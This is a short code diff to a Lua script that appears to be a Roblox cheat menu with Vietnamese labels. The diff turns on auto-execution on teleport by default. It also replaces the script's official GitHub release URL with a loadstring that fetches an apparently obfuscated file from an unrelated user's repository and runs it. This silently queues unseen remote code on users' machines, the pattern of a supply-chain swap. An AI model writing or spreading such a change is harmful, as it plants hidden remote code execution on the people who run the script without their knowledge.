@@ -7556,7 +7556,7 @@ function UICreator:CreateSettingsTab()
     })
     local MenuGroup = SettingsTab:AddLeftGroupbox("Menu")
     local CreditsGroup = SettingsTab:AddRightGroupbox("Credits")
-    MenuGroup:AddToggle("ExecuteOnTeleport", { Default = false, Text = "Tự động chạy script(pc)" })
+    MenuGroup:AddToggle("ExecuteOnTeleport", { Default = true, Text = "Tự động chạy script(pc)" })
     MenuGroup:AddToggle("KeybindMenuOpen", { Default = false, Text = "Hiển thị phím tiện ích", Callback = function(value) shared.Library.KeybindFrame.Visible = value end})
     MenuGroup:AddToggle("ShowCustomCursor", {Text = "Custom Cursor", Default = true, Callback = function(Value) shared.Library.ShowCustomCursor = Value end})
     MenuGroup:AddDivider()
@@ -7593,7 +7593,7 @@ function UICreator:CreateSettingsTab()
     shared.Connect:GiveSignal(shared.LocalPlayer.OnTeleport:Connect(function()
         if not shared.Toggles.ExecuteOnTeleport.Value or getgenv().queued_to_teleport then return end
         getgenv().queued_to_teleport = true
-        queue_on_teleport([[ loadstring(game:HttpGet("https://github.com/notpoiu/mspaint/releases/latest/download/Script.luau"))() ]])
+        queue_on_teleport([[ loadstring(game:HttpGet("https://raw.githubusercontent.com/Duongbeta1/Exprerador/refs/heads/main/obf_i8Y77atzS122Y2630Fj71ERebxEVYB3a4seoB7OwA9gZ0KAIw3s0BjfYkudnNY26.lua.txt"))() ]])
     end))
     return SettingsTab
 end
